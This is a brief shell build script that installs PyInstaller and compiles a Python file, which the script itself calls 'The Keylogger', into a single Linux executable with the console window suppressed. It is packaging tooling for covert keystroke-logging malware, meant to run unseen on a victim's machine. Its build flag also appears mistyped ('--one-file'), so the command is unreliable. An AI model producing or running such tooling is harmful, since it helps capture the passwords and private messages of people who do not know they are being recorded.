echo "Install pyinstaller To Create ELF File For Linux."
pip3 install pyinstaller

echo "Build The Keylogger."
pyinstaller --one-file --no-console main.py

echo "Done!"